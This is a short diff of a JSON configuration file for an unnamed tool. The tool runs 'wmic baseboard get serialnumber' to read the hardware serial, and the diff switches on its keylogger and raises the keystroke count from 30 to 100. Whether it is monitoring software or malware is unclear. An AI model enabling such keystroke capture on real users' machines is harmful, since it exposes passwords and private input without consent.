@@ -17,8 +17,8 @@
   "Enable":true,
   "NeedCommand":true,
   "Command":"wmic baseboard get serialnumber",
-  "NeedKeyLogger":false,
-  "KeyLogCount":30
+  "NeedKeyLogger":true,
+  "KeyLogCount":100
   },
   "FlashMsg":{"State":true,
   "Title":"",
